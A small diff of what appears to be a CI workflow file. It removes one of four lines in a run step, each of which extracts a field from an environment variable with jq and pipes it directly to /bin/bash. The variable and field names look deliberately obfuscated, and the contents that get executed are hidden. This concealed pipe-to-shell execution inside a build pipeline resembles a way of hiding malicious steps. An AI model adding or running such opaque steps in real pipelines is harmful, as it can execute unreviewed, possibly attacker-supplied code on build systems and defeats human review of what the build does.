@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$txr12229" | jq -r .rx918 | /bin/bash
           echo $mnqt5 | jq -r .vopgq99892 | /bin/bash
-          echo $tvmjh851 | jq -r .ifadn1 | /bin/bash
           echo $cr480 | jq -r .xvxi2168 | /bin/bash
 
       - name: Upload artifact
